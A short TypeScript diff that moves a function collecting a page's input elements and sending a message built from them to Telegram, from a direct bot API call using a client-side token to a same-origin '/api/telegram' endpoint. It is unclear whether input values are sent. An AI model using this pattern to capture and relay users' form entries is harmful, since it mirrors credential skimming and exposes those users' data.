@@ -1,31 +1,20 @@
 export async function sendPageInputTagsToTelegram(): Promise<void> {
-  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
-  const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
-
-  if (!botToken || !chatId) {
-    console.warn(
-      'Telegram bot token or chat id is not set. Skipping Telegram input tag send.',
-    );
-    return;
-  }
-
   const inputs = Array.from(document.querySelectorAll<HTMLInputElement>('input'))
     .filter((input) => isRelevantInput(input));
   const message = buildTelegramMessage(inputs);
 
   try {
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    await fetch('/api/telegram', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
       body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
+        message,
       }),
     });
   } catch (error) {
-    console.error('Failed to send Telegram message:', error);
+    console.error('Failed to send message via API:', error);
   }
 }
 
